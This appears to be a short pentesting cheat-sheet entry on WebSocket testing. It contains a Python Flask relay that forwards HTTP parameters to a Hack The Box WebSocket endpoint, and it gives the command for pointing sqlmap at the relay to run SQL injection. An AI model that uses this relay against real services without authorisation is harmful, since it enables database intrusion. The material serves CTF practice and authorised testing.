
Other useful tool to interact with websockets:
- like netcat but for websocket : https://github.com/vi/websocat
- tool to enumerate websocket : https://github.com/PalindromeLabs/STEWS

This middleware allow you to run a python middleware : a HTTP flask server redirectif HTTP requests to websocket, allowing you to fuze this middleware localhost instance with sqlmap and the requests will be redirected to your websocket target
another example can be found here : https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
```py
import websocket
from flask import Flask
from flask import request
import json

app = Flask(__name__)

# @app.route('/')
# def hello_world():
#    return 'Hello, World!'

@app.route('/')
def hello_world():
    ws = websocket.WebSocket()
    ws.connect("ws://ws.qreader.htb:5789/version")
    ws.send(json.dumps({"version":request.args.get('id')}))
    res = ws.recv()
    print(res)
    ws.close()
    return res

if __name__ == '__main__':
    app.run()

# in another terminal, just run : sqlmap -u "http://127.0.0.1:5000/?id=bla"
```